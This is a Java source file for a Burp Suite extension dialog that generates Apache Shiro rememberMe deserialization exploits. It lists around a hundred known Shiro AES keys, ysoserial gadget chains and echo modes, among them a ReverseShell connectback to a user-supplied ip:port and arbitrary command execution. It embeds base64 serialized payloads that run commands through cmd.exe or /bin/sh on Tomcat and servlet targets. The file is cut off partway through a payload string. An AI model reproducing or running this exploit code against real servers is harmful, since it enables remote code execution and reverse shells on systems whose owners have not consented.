package burp;

import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import ysoserial.GeneratePayload;
import ysoserial.payloads.*;

import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.MalformedURLException;
import java.net.Socket;

public class GenPayload extends JDialog {
    private JPanel contentPane;
    private JPanel buttonPane;
    private JPanel comboxPane;
    private JButton buttonOK;
    private JButton buttonCancel;
    private JComboBox selectKeys;
    private JComboBox selectEchos;
    private JComboBox selectGadgets;
    public static boolean bool=false;
    String[] keys = new String[]{
            "kPH+bIxk5D2deZiIxcaaaA=="
            ,"4AvVhmFLUs0KTA3Kprsdag=="
            ,"Z3VucwAAAAAAAAAAAAAAAA=="
            ,"fCq+/xW488hMTCD+cmJ3aQ=="
            ,"0AvVhmFLUs0KTA3Kprsdag=="
            ,"1AvVhdsgUs0FSA3SDFAdag=="
            ,"1QWLxg+NYmxraMoxAXu/Iw=="
            ,"25BsmdYwjnfcWmnhAciDDg=="
            ,"2AvVhdsgUs0FSA3SDFAdag=="
            ,"3AvVhmFLUs0KTA3Kprsdag=="
            ,"3JvYhmBLUs0ETA5Kprsdag=="
            ,"r0e3c16IdVkouZgk1TKVMg=="
            ,"5aaC5qKm5oqA5pyvAAAAAA=="
            ,"5AvVhmFLUs0KTA3Kprsdag=="
            ,"6AvVhmFLUs0KTA3Kprsdag=="
            ,"6NfXkC7YVCV5DASIrEm1Rg=="
            ,"6ZmI6I2j5Y+R5aSn5ZOlAA=="
            ,"cmVtZW1iZXJNZQAAAAAAAA=="
            ,"7AvVhmFLUs0KTA3Kprsdag=="
            ,"8AvVhmFLUs0KTA3Kprsdag=="
            ,"8BvVhmFLUs0KTA3Kprsdag=="
            ,"9AvVhmFLUs0KTA3Kprsdag=="
            ,"OUHYQzxQ/W9e/UjiAGu6rg=="
            ,"a3dvbmcAAAAAAAAAAAAAAA=="
            ,"aU1pcmFjbGVpTWlyYWNsZQ=="
            ,"bWljcm9zAAAAAAAAAAAAAA=="
            ,"bWluZS1hc3NldC1rZXk6QQ=="
            ,"bXRvbnMAAAAAAAAAAAAAAA=="
            ,"ZUdsaGJuSmxibVI2ZHc9PQ=="
            ,"wGiHplamyXlVB11UXWol8g=="
            ,"U3ByaW5nQmxhZGUAAAAAAA=="
            ,"MTIzNDU2Nzg5MGFiY2RlZg=="
            ,"L7RioUULEFhRyxM7a2R/Yg=="
            ,"a2VlcE9uR29pbmdBbmRGaQ=="
            ,"WcfHGU25gNnTxTlmJMeSpw=="
            ,"OY//C4rhfwNxCQAQCrQQ1Q=="
            ,"5J7bIJIV0LQSN3c9LPitBQ=="
            ,"f/SY5TIve5WWzT4aQlABJA=="
            ,"bya2HkYo57u6fWh5theAWw=="
            ,"WuB+y2gcHRnY2Lg9+Aqmqg=="
            ,"kPv59vyqzj00x11LXJZTjJ2UHW48jzHN"
            ,"3qDVdLawoIr1xFd6ietnwg=="
            ,"ZWvohmPdUsAWT3=KpPqda"
            ,"YI1+nBV//m7ELrIyDHm6DQ=="
            ,"6Zm+6I2j5Y+R5aS+5ZOlAA=="
            ,"2A2V+RFLUs+eTA3Kpr+dag=="
            ,"6ZmI6I2j3Y+R1aSn5BOlAA=="
            ,"SkZpbmFsQmxhZGUAAAAAAA=="
            ,"2cVtiE83c4lIrELJwKGJUw=="
            ,"fsHspZw/92PrS3XrPW+vxw=="
            ,"XTx6CKLo/SdSgub+OPHSrw=="
            ,"sHdIjUN6tzhl8xZMG3ULCQ=="
            ,"O4pdf+7e+mZe8NyxMTPJmQ=="
            ,"HWrBltGvEZc14h9VpMvZWw=="
            ,"rPNqM6uKFCyaL10AK51UkQ=="
            ,"Y1JxNSPXVwMkyvES/kJGeQ=="
            ,"lT2UvDUmQwewm6mMoiw4Ig=="
            ,"MPdCMZ9urzEA50JDlDYYDg=="
            ,"xVmmoltfpb8tTceuT5R7Bw=="
            ,"c+3hFGPjbgzGdrC+MHgoRQ=="
            ,"ClLk69oNcA3m+s0jIMIkpg=="
            ,"Bf7MfkNR0axGGptozrebag=="
            ,"1tC/xrDYs8ey+sa3emtiYw=="
            ,"ZmFsYWRvLnh5ei5zaGlybw=="
            ,"cGhyYWNrY3RmREUhfiMkZA=="
            ,"IduElDUpDDXE677ZkhhKnQ=="
            ,"yeAAo1E8BOeAYfBlm4NG9Q=="
            ,"cGljYXMAAAAAAAAAAAAAAA=="
            ,"2itfW92XazYRi5ltW0M2yA=="
            ,"XgGkgqGqYrix9lI6vxcrRw=="
            ,"ertVhmFLUs0KTA3Kprsdag=="
            ,"5AvVhmFLUS0ATA4Kprsdag=="
            ,"s0KTA3mFLUprK4AvVhsdag=="
            ,"hBlzKg78ajaZuTE0VLzDDg=="
            ,"9FvVhtFLUs0KnA3Kprsdyg=="
            ,"d2ViUmVtZW1iZXJNZUtleQ=="
            ,"yNeUgSzL/CfiWw1GALg6Ag=="
            ,"NGk/3cQ6F5/UNPRh8LpMIg=="
            ,"4BvVhmFLUs0KTA3Kprsdag=="
            ,"MzVeSkYyWTI2OFVLZjRzZg=="
            ,"CrownKey==a12d/dakdad"
            ,"empodDEyMwAAAAAAAAAAAA=="
            ,"A7UzJgh1+EWj5oBFi+mSgw=="
            ,"c2hpcm9fYmF0aXMzMgAAAA=="
            ,"i45FVt72K2kLgvFrJtoZRw=="
            ,"U3BAbW5nQmxhZGUAAAAAAA=="
            ,"ZnJlc2h6Y24xMjM0NTY3OA=="
            ,"Jt3C93kMR9D5e8QzwfsiMw=="
            ,"MTIzNDU2NzgxMjM0NTY3OA=="
            ,"vXP33AonIp9bFwGl7aT7rA=="
            ,"V2hhdCBUaGUgSGVsbAAAAA=="
            ,"Q01TX0JGTFlLRVlfMjAxOQ=="
            ,"ZAvph3dsQs0FSL3SDFAdag=="
            ,"Is9zJ3pzNh2cgTHB4ua3+Q=="
            ,"NsZXjXVklWPZwOfkvk6kUA=="
            ,"GAevYnznvgNCURavBhCr1w=="
            ,"66v1O8keKNV3TTcGPK1wzg=="
            ,"SDKOLKn2J1j/2BHjeZwAoQ=="
    };

    String[] gadgets={
            "CommonsBeanutils1",
            "CommonsBeanutils2",
            "CommonsCollections3",
            "CommonsCollections4",
            "CommonsCollections10",
           // "CommonsCollections11",
            "Jdk7u21",
           // "JRE8u20",
            "ROME",
            "JSON1"
    };

    String[] echos={
            "TomcatEcho",
            "SpringEcho",
           // "WeblogicEcho",
            "HttpEcho",
            "DnsLogEcho",
            "ReverseShell",
            "CMD"
    };
    public GenPayload() throws Exception {
        setSize(600,370);//这句要写在前面
        setLocationRelativeTo(null);//这句可让窗体自动居中屏幕
        contentPane=new JPanel();
        buttonPane=new JPanel();
        comboxPane=new JPanel();
        buttonOK=new JButton("确定");
        buttonCancel=new JButton("取消");
        selectKeys=new JComboBox();
        selectGadgets=new JComboBox();
        selectEchos=new JComboBox();

        setContentPane(contentPane);

        setModal(true);
        getRootPane().setDefaultButton(buttonOK);
        contentPane.setLayout(new GridLayout(3,1));

        contentPane.add(comboxPane);
        contentPane.add(buttonPane);

        comboxPane.add(selectKeys);
        comboxPane.add(selectGadgets);
        comboxPane.add(selectEchos);


        buttonPane.add(buttonOK);
        buttonPane.add(buttonCancel);

        buttonOK.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                onOK();
            }
        });

        buttonCancel.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                onCancel();
            }
        });

        // call onCancel() when cross is clicked
        setDefaultCloseOperation(DO_NOTHING_ON_CLOSE);
        addWindowListener(new WindowAdapter() {
            public void windowClosing(WindowEvent e) {
                onCancel();
            }
        });
        for (String key:keys) {
            selectKeys.addItem(key);
        }
        for (String gadget:gadgets) {
            selectGadgets.addItem(gadget);
        }
        for (String echo:echos) {
            selectEchos.addItem(echo);
        }
        // call onCancel() on ESCAPE
        contentPane.registerKeyboardAction(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                onCancel();
            }
        }, KeyStroke.getKeyStroke(KeyEvent.VK_ESCAPE, 0), JComponent.WHEN_ANCESTOR_OF_FOCUSED_COMPONENT);

    }

    public String gen() throws Exception {
        String key=selectKeys.getSelectedItem().toString();
        String gadget=selectGadgets.getSelectedItem().toString();
        String echo=selectEchos.getSelectedItem().toString();
        String rememberMe="";
        byte[] bytes=null;
        if(echo.equals("ReverseShell")){
            String reverseShell = JOptionPane.showInputDialog("Please input a ip:port \nReverseShell 127.0.0.1:80");
            echo="connectback:"+reverseShell;
        }
        if(echo.equals("CMD")){
            String cmd = JOptionPane.showInputDialog("Please input a command \nCMD nslookup dnslog.cn");
            echo=cmd;
        }
        if(echo.equals("DnsLogEcho")){
            String dnsEcho = JOptionPane.showInputDialog("Please input a  cmd;dnslog.cn\nDnsLogEcho whoami;dnslog.cn");
            echo="DnsLogEcho:"+dnsEcho;
        }
        if(gadget.equals("CommonsBeanutils2")){
            if(echo.equals("TomcatEcho")){
                bytes = Base64.decode("rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LPjgGC/k7xfgIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAISQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WgAVX3VzZVNlcnZpY2VzTWVjaGFuaXNtTAALX2F1eENsYXNzZXN0ADtMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvSGFzaHRhYmxlO1sACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAETAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////wBwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAADprK/rq+AAAAMwDsCgAZAGoKABcAawoAbABtCgBsAG4KABkAbwoAcABxCgBwAHIIAHMKAD4AdAcAXAoAcAB1CAB2CgAmAHcIAHgIAHkIAHoIAHsHAHwHAH0IAH4KABcAfwgAgAcAgQoAFwCCBwCDCgCEAIUIAIYHAIcKABwAiAsAiQCKCwCJAIsIAIwHAI0IAI4KAI8AkAoAJgCRCACSBwCTCACUCACVCABRCgAhAJYIAJcIAJgHAJkHAJoKAC4AmwoALgCcCgCdAJ4KAC0AnwgAoAoALQChCgAtAKIKACEAowgApAoApQCmCgBwAKcIAKgKAKkAqgoAqwCsCgClAK0HAK4BAARnZXRPAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJEx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9Ub21jYXRFY2hvOwEAAW8BABJMamF2YS9sYW5nL09iamVjdDsBAAFzAQASTGphdmEvbGFuZy9TdHJpbmc7AQABZgEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAApFeGNlcHRpb25zAQAGPGluaXQ+AQADKClWAQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAA2NtZAEAE1tMamF2YS9sYW5nL1N0cmluZzsBAANzdHIBAAFyAQAbTG9yZy9hcGFjaGUvY295b3RlL1JlcXVlc3Q7AQABcAEAAmkkAQAUTGphdmEvdXRpbC9JdGVyYXRvcjsBAAF0AQASTGphdmEvbGFuZy9UaHJlYWQ7AQAEYXJyJAEAE1tMamF2YS9sYW5nL1RocmVhZDsBAARsZW4kAQABSQEADVN0YWNrTWFwVGFibGUHAK4HAJMHAK8HAHwHAIMHALAHAI0HAFIBAApTb3VyY2VGaWxlAQAPVG9tY2F0RWNoby5qYXZhDACxALIMALMAtAcAtQwAtgC3DAC4ALkMAE0ATgcArwwAugC7DAC8AL0BAAd0aHJlYWRzDAA/AEAMAL4AvwEABGV4ZWMMAMAAwQEABGh0dHABAAZ0YXJnZXQBAAZ0aGlzJDABAAdoYW5kbGVyAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAK29yZy9hcGFjaGUvdG9tY2F0L3V0aWwvbmV0L0Fic3RyYWN0RW5kcG9pbnQBAAZnbG9iYWwMAMIAsgEACWdldEdsb2JhbAEAD2phdmEvbGFuZy9DbGFzcwwAwwDEAQAQamF2YS9sYW5nL09iamVjdAcAxQwAxgDHAQAKcHJvY2Vzc29ycwEAE2phdmEvdXRpbC9BcnJheUxpc3QMAMgAyQcAsAwAygDLDADMAM0BAANyZXEBABlvcmcvYXBhY2hlL2NveW90ZS9SZXF1ZXN0AQAHb3MubmFtZQcAzgwAzwDQDADRAL8BAAZ3aW5kb3cBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jDADSANABAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgwATQDTDADUANUHANYMANcA2AwATQDZAQACXEEMANoA2wwAzAC/DADcAN0BAAlTZXJ2ZXItb2sHAN4MAN8A4AwA4QDiAQABLwcA4wwA5ADlBwDmDADnAL8MAOgA4AEAInlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL1RvbWNhdEVjaG8BABBqYXZhL2xhbmcvVGhyZWFkAQASamF2YS91dGlsL0l0ZXJhdG9yAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQANZ2V0U3VwZXJjbGFzcwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGl0ZXJhdG9yAQAWKClMamF2YS91dGlsL0l0ZXJhdG9yOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAUKClMamF2YS9sYW5nL09iamVjdDsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAJZ2V0SGVhZGVyAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQALZ2V0UmVzcG9uc2UBAB4oKUxvcmcvYXBhY2hlL2NveW90ZS9SZXNwb25zZTsBABpvcmcvYXBhY2hlL2NveW90ZS9SZXNwb25zZQEACXNldEhlYWRlcgEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspVgEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAtnZXRSZXNvdXJjZQEAIihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbmV0L1VSTDsBAAxqYXZhL25ldC9VUkwBAAdnZXRQYXRoAQAJYWRkSGVhZGVyAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcA6QoA6gBvACEAPgDqAAAAAAACAAEAPwBAAAIAQQAAAGQAAgAEAAAAFCu2AAEstgACTi0EtgADLSu2AASwAAAAAgBCAAAADgADAAAAEQAJABIADgATAEMAAAAqAAQAAAAUAEQARQAAAAAAFABGAEcAAQAAABQASABJAAIACQALAEoASwADAEwAAAAEAAEAEgABAE0ATgACAEEAAAM8AAUADAAAAXMqtwDrKrgABrYABxIItgAJwAAKwAAKTi2+NgQDNgUVBRUEogFQLRUFMjoGGQa2AAtNLBIMtgANmgE1LBIOtgANmQEsKioqGQYSD7YACRIQtgAJEhG2AAlMpwArOgcqKhkGEg+2AAkSELYACUwTABMSEbYAAjoIGQgEtgADGQgrtgAETCorEhS2AAlMpwAeOgcrtgABtgAVEhYDvQAXtgAYKwO9ABm2ABpMKisSG7YACcAAHLYAHToHGQe5AB4BAJkAqhkHuQAfAQA6CCoZCBIgtgAJwAAhOgkSIrgAI7YAJBIltgANmQAeBr0AJlkDEidTWQQSKFNZBRkJEim2ACpTpwAbBr0AJlkDEitTWQQSLFNZBRkJEim2ACpTOgq7AC1ZuwAuWRkKtwAvtgAwtgAxtwAyEjO2ADS2ADU6CxkJtgA2EjcZC7YAOKcAHToKGQm2ADYSN7gABrYAORI6tgA7tgA8tgA9p/9SpwAJhAUBp/6vsQADAEMAWABbABIAgwCLAI4AEgDYAUkBTAASAAMAQgAAAG4AGwAAABYABAAZACsAGgAxABsAQwAdAFgAJABbAB4AXQAgAGwAIQB2ACIAfAAjAIMAJwCLACsAjgAoAJAAKgCpACwAywAtANgALwEdADABPQAxAUkANgFMADMBTgA0AWYANwFpADgBbAAZAXIAOwBDAAAAogAQAHYADQBKAEsACABdACYATwBQAAcAkAAZAE8AUAAHAR0ALABRAFIACgE9AAwAUwBJAAsBTgAYAE8AUAAKANgAjgBUAFUACQDLAJsAVgBHAAgAuACxAFcAWAAHAFgBFABGAEcAAQArAUEAWQBaAAYAMQFBAEgASQACABcBWwBbAFwAAwAbAVcAXQBeAAQAHgFUAFcAXgAFAAABcwBEAEUAAABfAAAAgwAN/wAeAAYHAGAAAAcACgEBAAD/ADwABwcAYAAHAGEHAAoBAQcAYgABBwBj/wAnAAcHAGAHAGQHAGEHAAoBAQcAYgAASgcAYxr8AA4HAGX9AEoHAGQHAGZXBwBncAcAY/kAGfoAAv8AAgAGBwBgAAcAYQcACgEBAAD/AAUAAQcAYAAAAEwAAAAEAAEAEgABAGgAAAACAGlwdAABYXB3AQB4cQB+AA54");
            }
            if(echo.equals("HttpEcho")){
                bytes = Base64.decode("rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LPjgGC/k7xfgIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAISQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WgAVX3VzZVNlcnZpY2VzTWVjaGFuaXNtTAALX2F1eENsYXNzZXN0ADtMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvSGFzaHRhYmxlO1sACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAETAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////wBwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAEjDK/rq+AAAAMwEGCgAaAIoJAEUAiwkARQCMBwCNCgAEAIoJAEUAjgkARQCPCACQCgCRAJIJAEUAkwgAlAkARQCVBwCWCgANAJcKAJgAmQoARQCaCgAEAJsKAAQAnAoARQCdCgAaAJ4KABcAnwgAoAcAoQcAogoAFwCjBwCkCABPCgClAKYJAEUApwgAqAoAqQCqCgAYAKsIAKwKABgArQgArggArwgAsAgAsQkARQCyCABmBwCzBwC0CgAqAJcHALUKACwAlwcAtgoALgCXCAC3BwC4BwC5CgC6ALsKALoAvAoAvQC+CgAyAL8IAMAKADIAwQoAMgDCCgAxAMMKADEAxAoAMQDFCgAXAMYKAMcAyAoAxwDJCgAXAMoKAEUAywcAfAoAFwDMCgCYAM0HAM4BAAFoAQATTGphdmEvdXRpbC9IYXNoU2V0OwEACVNpZ25hdHVyZQEAJ0xqYXZhL3V0aWwvSGFzaFNldDxMamF2YS9sYW5nL09iamVjdDs+OwEAAmNsAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAANoc3IBABFMamF2YS9sYW5nL0NsYXNzOwEAA2hzcAEAA2NtZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAAXABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQABZQEAIkxqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbjsBAAR0aGlzAQAcTHlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0hFOwEADVN0YWNrTWFwVGFibGUHAM4HAJYBAAFpAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQADb2JqAQAWKExqYXZhL2xhbmcvT2JqZWN0O0kpVgEAC2dldFJlc3BvbnNlAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBACJMamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb247AQAtTGphdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb247AQAhTGphdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb247AQACcHcBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAFvAQAFZGVwdGgBAAFJBwBSBwCzBwC0BwC1BwC2BwCkBwC4AQAKRXhjZXB0aW9ucwEAAUYBAAFxAQAEYXJyJAEAE1tMamF2YS9sYW5nL09iamVjdDsBAARsZW4kAQACaSQBAA1kZWNsYXJlZEZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAGltMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAFc3RhcnQBAAFuBwChBwCBBwDPAQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAHSEUuamF2YQwAVgBXDABTAFQMAFUAVAEAEWphdmEvdXRpbC9IYXNoU2V0DABGAEcMAEoASwEAJWphdmF4LnNlcnZsZXQuaHR0cC5IdHRwU2VydmxldFJlcXVlc3QHANAMANEA0gwATABNAQAmamF2YXguc2VydmxldC5odHRwLkh0dHBTZXJ2bGV0UmVzcG9uc2UMAE4ATQEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uDADTAFcHANQMANUA1gwAeQBlDADXAGMMANgAYwwAYgBjDADZANoMANsA3AEACWdldEhlYWRlcgEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9TdHJpbmcMAN0A3gEAEGphdmEvbGFuZy9PYmplY3QHAN8MAOAA4QwATwBQAQAHb3MubmFtZQcA4gwA4wDkDADlAOYBAAN3aW4MANcA5wEAB2NtZC5leGUBAAIvYwEACS9iaW4vYmFzaAEAAi1jDABRAFIBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24BACtqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uVGFyZ2V0RXhjZXB0aW9uAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgEACWdldFdyaXRlcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBABFqYXZhL3V0aWwvU2Nhbm5lcgcA6AwA6QDqDADrAOwHAO0MAO4A7wwAVgDwAQACXEEMAPEA8gwA8wDmDAD0APUMAPYAVwwA9wBXDAD4APkHAM8MAPoA+wwA/AD9DAD+AP8MAFUAZQwBAADaDAEBAQIBABp5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9IRQEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAD3ByaW50U3RhY2tUcmFjZQEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBAAhjb250YWlucwEAA2FkZAEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGlzQXNzaWduYWJsZUZyb20BABQoTGphdmEvbGFuZy9DbGFzczspWgEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFZmx1c2gBAAVjbG9zZQEAEWdldERlY2xhcmVkRmllbGRzAQAcKClbTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAdpc0FycmF5AQADKClaAQANZ2V0U3VwZXJjbGFzcwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwEDCgEEAIoAIQBFAQQAAAAIAAgARgBHAAEASAAAAAIASQAIAEoASwAAAAgATABNAAAACABOAE0AAAAIAE8AUAAAAAgAUQBSAAAACABTAFQAAAAIAFUAVAAAAAUAAQBWAFcAAQBYAAAAtgACAAIAAAA8KrcBBQ